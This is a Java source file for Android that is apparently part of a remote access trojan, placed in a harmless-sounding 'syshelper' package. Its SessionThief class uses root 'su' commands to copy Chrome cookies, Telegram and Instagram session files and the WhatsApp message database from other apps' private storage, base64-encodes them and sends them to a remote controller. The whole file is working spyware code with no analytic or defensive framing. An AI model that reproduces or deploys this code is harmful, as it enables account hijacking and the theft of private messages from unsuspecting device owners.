package com.syshelper.service;
import android.content.Context;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

public class SessionThief {
    private final Context ctx;
    private final RatClient client;
    private static final Map<String, String[]> TARGETS = new HashMap<>();
    static {
        TARGETS.put("com.android.chrome", new String[]{"app_chrome/Default/Cookies"});
        TARGETS.put("org.telegram.messenger", new String[]{"files/TGDict.dat"});
        TARGETS.put("com.instagram.android", new String[]{"shared_prefs/instagram.xml"});
        TARGETS.put("com.whatsapp", new String[]{"databases/msgstore.db"});
    }

    public SessionThief(Context ctx, RatClient client) { this.ctx = ctx; this.client = client; }

    public void stealAll() {
        new Thread(() -> {
            JSONObject result = new JSONObject(); JSONArray stolenSessions = new JSONArray();
            for (Map.Entry<String, String[]> entry : TARGETS.entrySet()) {
                String pkg = entry.getKey(); String[] files = entry.getValue();
                try { ctx.getPackageManager().getPackageInfo(pkg, 0); JSONObject sd = extractSessionData(pkg, files); if (sd != null) stolenSessions.put(sd); } catch (Exception ignored) {}
            }
            try { result.put("sessions", stolenSessions); client.sendResult("session_theft", result); } catch (Exception ignored) {}
        }).start();
    }

    private JSONObject extractSessionData(String pkg, String[] files) {
        try {
            JSONObject data = new JSONObject(); data.put("package", pkg); JSONArray fileData = new JSONArray();
            for (String fp : files) {
                String content = readWithRoot("/data/data/" + pkg + "/" + fp);
                if (content != null) { JSONObject f = new JSONObject(); f.put("path", fp); f.put("data", content); fileData.put(f); }
            }
            data.put("files", fileData); return data;
        } catch (Exception e) { return null; }
    }

    private String readWithRoot(String path) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "cat '" + path + "' | base64"});
            p.waitFor(5, TimeUnit.SECONDS);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder(); String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close(); return sb.length() > 0 ? sb.toString() : null;
        } catch (Exception e) { return null; }
    }
}
